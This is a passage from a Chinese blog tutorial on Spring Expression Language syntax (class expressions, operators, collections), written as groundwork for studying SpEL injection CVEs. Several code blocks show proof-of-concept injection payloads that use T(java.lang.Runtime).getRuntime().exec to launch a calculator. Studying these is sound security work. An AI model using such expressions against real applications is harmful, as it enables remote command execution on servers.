com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        TextEditor te = (TextEditor) context.getBean(<span class="string">"textEditor"</span>);</span><br><span class="line">        te.spellCheck();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Beans.xml，通过<code>value=&quot;#{bean id}&quot;</code>的方式替换掉之前的ref属性设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for textEditor bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.TextEditor"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;constructor-arg ref="spellChecker"/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;spellChecker&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"spellChecker"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.SpellChecker"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inside SpellChecker constructor.</span><br><span class="line">Inside TextEditor constructor.</span><br><span class="line">Inside checkSpelling.</span><br></pre></td></tr></table></figure><h3 id="类类型表达式T-Type"><a href="#类类型表达式T-Type" class="headerlink" title="类类型表达式T(Type)"></a>类类型表达式T(Type)</h3><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p><p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p><p>在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"random"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Expression中使用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// java.lang 包类访问</span></span><br><span class="line">Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"><span class="comment">//其他包类访问</span></span><br><span class="line">String expression2 = <span class="string">"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')"</span>;</span><br><span class="line">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"><span class="comment">//类静态字段访问</span></span><br><span class="line"><span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">"T(Integer).MAX_VALUE"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result3);</span><br><span class="line"><span class="comment">//类静态方法调用</span></span><br><span class="line"><span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">"T(Integer).parseInt('1')"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result4);</span><br></pre></td></tr></table></figure><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>在前面字面值的Demo中修改Beans.xml即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出随机值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : 0.7593490190723996</span><br></pre></td></tr></table></figure><h4 id="恶意利用——弹计算器"><a href="#恶意利用——弹计算器" class="headerlink" title="恶意利用——弹计算器"></a>恶意利用——弹计算器</h4><p>修改value中类类型表达式的类为Runtime并调用其命令执行方法即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Runtime).getRuntime().exec('calc')&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行即可弹计算器。</p><h3 id="SpEL用法"><a href="#SpEL用法" class="headerlink" title="SpEL用法"></a>SpEL用法</h3><p>SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。</p><p>前面的就是以XML配置为例对SpEL表达式的用法进行的说明，而注解@Value的用法例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmailSender</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;spring.mail.username&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String mailUsername;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"#&#123; systemProperties['user.region'] &#125;"</span>)    </span><br><span class="line">    <span class="keyword">private</span> String defaultLocale;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面具体看下Expression的。</p><h4 id="Expression用法"><a href="#Expression用法" class="headerlink" title="Expression用法"></a>Expression用法</h4><p>由于后续分析的各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里再单独说明SpEL表达式Expression这种形式的用法。</p><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><blockquote><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(<span class="string">"('Hello' + ' Mi1k7ea').concat(#end)"</span>);</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"end"</span>, <span class="string">"!"</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure><p>具体步骤如下：</p><ol><li>创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li><li>解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；</li><li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li><li>求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；</li></ol><h5 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h5><ul><li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li><li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</li><li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</li></ul><h5 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h5><p>应用示例如下，和前面XML配置的用法区别在于程序会将这里传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过<code>#{}</code>符号来注明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串字面量</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 算数运算</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的</span></span><br><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line"><span class="comment">// String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure><h5 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h5><p>类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"new java.util.Date()"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure><h3 id="SpEL表达式运算"><a href="#SpEL表达式运算" class="headerlink" title="SpEL表达式运算"></a>SpEL表达式运算</h3><p>下面内容引用自<a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a>。</p><p>SpEL提供了以下几种运算符：</p><table><thead><tr><th style="text-align:left">运算符类型</th><th style="text-align:left">运算符</th></tr></thead><tbody><tr><td style="text-align:left">算数运算</td><td style="text-align:left">+, -, *, /, %, ^</td></tr><tr><td style="text-align:left">关系运算</td><td style="text-align:left">&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge</td></tr><tr><td style="text-align:left">逻辑运算</td><td style="text-align:left">and, or, not, !</td></tr><tr><td style="text-align:left">条件运算</td><td style="text-align:left">?:(ternary), ?:(Elvis)</td></tr><tr><td style="text-align:left">正则表达式</td><td style="text-align:left">matches</td></tr></tbody></table><h4 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h4><p>加法运算：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total+42&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>加号还可以用于字符串拼接：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"blogName"</span> <span class="attr">value</span>=<span class="string">"#&#123;my blog name is+' '+mrBird &#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><code>^</code>运算符执行幂运算，其余算数运算符和Java一毛一样，这里不再赘述。</p><h4 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h4><p>判断一个Bean的某个属性是否等于100：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total==100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>返回值是boolean类型。关系运算符唯一需要注意的是：在Spring XML配置文件中直接写&gt;=和&lt;=会报错。因为这”&lt;”和”&gt;”两个符号在XML中有特殊的含义。所以实际使用时，最号使用文本类型代替符号：</p><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">符号</th><th style="text-align:left">文本类型</th></tr></thead><tbody><tr><td style="text-align:left">等于</td><td style="text-align:left">==</td><td style="text-align:left">eq</td></tr><tr><td style="text-align:left">小于</td><td style="text-align:left">&lt;</td><td style="text-align:left">lt</td></tr><tr><td style="text-align:left">小于等于</td><td style="text-align:left">&lt;=</td><td style="text-align:left">le</td></tr><tr><td style="text-align:left">大于</td><td style="text-align:left">&gt;</td><td style="text-align:left">gt</td></tr><tr><td style="text-align:left">大于等于</td><td style="text-align:left">&gt;=</td><td style="text-align:left">ge</td></tr></tbody></table><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total le 100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>SpEL表达式提供了多种逻辑运算符，其含义和Java也是一毛一样，只不过符号不一样罢了。</p><p>使用and运算符：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"largeCircle"</span> <span class="attr">value</span>=<span class="string">"#&#123;shape.kind == 'circle' and shape.perimeter gt 10000&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>两边为true时才返回true。</p><p>其余操作一样，只不过非运算有<code>not</code>和<code>!</code>两种符号可供选择。非运算：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"outOfStack"</span> <span class="attr">value</span>=<span class="string">"#&#123;!product.available&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h4><p>条件运算符类似于Java的三目运算符：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;songSelector.selectSong() == 'May Rain' ? piano:saxphone&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>当选择的歌曲为”May Rain”的时候，一个id为piano的Bean将装配到instrument属性中，否则一个id为saxophone的Bean将装配到instrument属性中。注意区别piano和字符串“piano”！</p><p>一个常见的三目运算符的使用场合是判断是否为null值：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ? kenny.song:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这里，kenny.song引用重复了两次，SpEL提供了三目运算符的变体来简化表达式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ?:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在以上示例中，如果kenny.song不为null，那么表达式的求值结果是kenny.song否则就是“Jingle Bells”。</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>验证邮箱：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"#&#123;admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>虽然这个邮箱正则不够健壮，但对于演示matches来说足够啦。</p><h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><p>SpEL表达式支持对集合进行操作。</p><p>下面我们以示例看下能进行哪些集合操作。</p><p>我们先创建一个City类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">City</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> population;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(String state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPopulation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> population;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPopulation</span><span class="params">(<span class="keyword">int</span> population)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.population = population;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Beans.xml，使用<code>&lt;util:list&gt;</code>元素配置一个包含City对象的List集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:util</span>=<span class="string">"http://www.springframework.org/schema/util"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util/spring-util-4.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">util:list</span> <span class="attr">id</span>=<span class="string">"cities"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Chicago"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"IL"</span> <span class="attr">p:population</span>=<span class="string">"2853114"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Atlanta"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"GA"</span> <span class="attr">p:population</span>=<span class="string">"537958"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Dallas"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"1279910"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Houston"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"2242193"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Odessa"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"90943"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"El Paso"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"613190"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Jal"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"1996"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Las Cruces"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"91865"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">util:list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="访问集合成员"><a href="#访问集合成员" class="headerlink" title="访问集合成员"></a>访问集合成员</h4><p>SpEL表达式支持通过<code>#{集合ID[i]}</code>的方式来访问集合中的成员。</p><p>定义一个ChoseCity类：</p><figure class="highlight 